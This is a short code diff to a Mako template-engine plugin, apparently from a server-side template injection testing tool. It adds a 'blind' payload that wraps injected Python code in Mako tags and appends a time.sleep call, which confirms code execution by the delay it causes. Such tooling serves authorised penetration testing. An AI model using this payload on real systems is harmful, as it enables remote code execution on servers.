@@ -29,6 +29,10 @@ class Mako(Plugin):
         'evaluate' : {
             'call': 'render',
             'evaluate': '<%% %(code)s %%>'
+        },
+        'blind' : {
+            'call': 'inject',
+            'blind': """<%% (%(code)s) and __import__("time").sleep(%(delay)i) %%>"""
         }
 
     }
